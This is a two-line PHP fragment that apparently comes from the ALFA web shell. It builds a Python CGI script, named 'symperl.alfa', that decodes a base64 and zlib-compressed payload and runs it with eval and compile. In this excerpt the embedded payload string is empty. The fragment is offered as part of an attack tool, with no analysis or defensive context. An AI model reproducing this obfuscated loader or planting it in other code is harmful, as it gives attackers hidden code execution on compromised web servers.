	$py = '#!/usr/bin/python'."\nimport zlib, base64\nalfa_data='".__ALFA_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("")),\'<string>\',\'exec\'))';
	$cginame = "symperl.alfa";
